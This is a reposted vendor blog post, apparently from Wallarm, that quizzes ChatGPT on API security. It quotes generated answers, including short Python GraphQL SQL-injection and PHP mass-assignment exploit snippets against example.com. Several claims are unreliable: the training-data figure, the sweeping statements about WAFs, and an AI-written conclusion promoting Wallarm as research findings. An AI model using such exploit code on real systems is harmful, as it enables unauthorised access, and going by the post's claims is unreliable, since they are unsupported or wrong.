---
title: What ChatGPT know about API Security?
url: https://buaq.net/go-139418.html
source: unSafe.sh - 不安全
date: 2022-12-11
fetch_date: 2025-10-04T01:10:50.638593
---

# What ChatGPT know about API Security?

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

What ChatGPT know about API Security?

There is no doubt that you heard about and seen the latest OpenAI’s brilliant called ChatGPT.
*2022-12-10 06:6:57
Author: [lab.wallarm.com(查看原文)](/jump-139418.htm)
阅读量:30
收藏*

---

There is no doubt that you heard about and seen the latest [OpenAI’s](https://chat.openai.com/) brilliant called [ChatGPT](https://chat.openai.com/). It can write poems, speak many languages, answer questions, play chess, make code and impress everyone. In this post, we show a few more of how this AI model is good in cybersecurity, in particular in API Security implementations.

ChatGPT is a natural language processing (NLP) model that uses large amounts of data to generate human-like responses to chat messages. It was trained on a dataset of over 1.3 billion words from various sources, including social media conversations, books, and news articles. The model uses GPT-3, the largest and most powerful language model to date, to generate responses that are relevant and coherent to the input text. Because of the wide range of data sources used for training, ChatGPT can answer a lot of questions, even on a super specific topic, such as API Security.

Let’s just test it with the following question: **“what Gartner says about API security in 2022”**:

***According to Gartner, API security will become a top priority for organizations in 2022. As the use of APIs continues to grow, so too will the need for strong security measures to protect sensitive data and prevent cyber attacks. Gartner predicts that API security will be integrated into overall cybersecurity strategies, with a focus on authentication, authorization, and encryption. Additionally, Gartner predicts that API security solutions will evolve to include machine learning and artificial intelligence technologies to help identify and prevent potential threats.***

Not bad for the soulless AI, right? Let’s continue: **“why WAFs can’t stop API attacks, from the technical standpoint only”**

***There are several reasons why WAFs cannot stop API attacks from a technical standpoint. First, WAFs are designed to protect web applications, not APIs. While APIs and web applications share some common features, they are fundamentally different and require different security approaches.***

***Second, WAFs rely on predefined rules and signatures to identify and block potential threats. However, APIs can be dynamically generated and accessed, making it difficult for WAFs to keep up with the constantly changing nature of APIs.***

***Third, WAFs are often deployed at the network level, which means they only have visibility into the network traffic and cannot see the underlying application logic. This makes it difficult for WAFs to detect and prevent attacks that exploit vulnerabilities in the API itself, such as SQL injection or cross-site scripting.***

***Overall, WAFs are not well-suited to protect APIs from attacks, and organizations that rely solely on WAFs for API security are at risk of leaving their APIs exposed to threats.***

All true! But let’s try something really specific, like an exploit coding. make a Python code to exploit GraphQL endpoint by SQL injection attack: **“make a Python code to exploit GraphQL endpoint by SQL injection attack”**:

***The following is a sample Python code to exploit a GraphQL endpoint using a SQL injection attack:***

```
import requests

# Set the GraphQL endpoint URL
endpoint = "http://example.com/graphql"

# Set the GraphQL query with a SQL injection payload
query = """
query {
  users(filter: "username='admin' OR 1=1") {
    username
    password
  }
}
"""

# Send the GraphQL query to the endpoint
response = requests.post(endpoint, json={"query": query})

# Print the response
print(response.json())
```

***This code sends a GraphQL query to the specified endpoint, injecting a SQL injection payload into the `filter` parameter of the `users` query. If the GraphQL endpoint is vulnerable to SQL injection, this query will bypass the authentication checks and return the username and password for the `admin` user.***

That’s a valid exploit code and crispy explanation of how it works. What else it can do? Let’s try Mass Assignment for REST APIs:

The following is a sample PHP exploit for the Mass Assignment vulnerability of a REST API with PHP. **“make PHP exploit for the Mass Assignment vulnerability of the REST API”**:

***The following is a sample PHP exploit for the Mass Assignment vulnerability of a REST API:***

```
<?php

// Set the REST API endpoint URL
$endpoint = "http://example.com/api/users";

// Set the user data with an additional admin field
$data = [
    "username" => "johnsmith",
    "password" => "password123",
    "admin" => true
];

// Send a POST request to the endpoint with the user data
$response = http_post_data($endpoint, json_encode($data));

// Print the response
print_r($response);

?>
```

***This code sends a POST request to the specified REST API endpoint with a user data payload that includes an additional `admin` field. If the REST API is vulnerable to Mass Assignment, this payload will be accepted and the `johnsmith` user will be created with admin privileges.***

That’s just awesome, it seems like it knows well OWASP API Security Top 10 and the newest trends in cyber security. OK, just let the AI to finish this post.

“Write the latest paragraph for the blog post with conclusions about the applications of ChatGPT to API security and a reference to the Wallarm website”:

***Based on our research and experimentation, we have found that ChatGPT has promising applications for API security. By leveraging the advanced natural language processing capabilities of ChatGPT, API security systems can effectively defend against a wide range of attacks, including sophisticated ones that are difficult for traditional security systems to detect. We highly recommend checking out the API security solutions offered by [Wallarm](https://wallarm.com), which incorporate the use of ChatGPT to provide robust protection for your API infrastructure.***

文章来源: https://lab.wallarm.com/what-chatgpt-know-about-api-security/
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)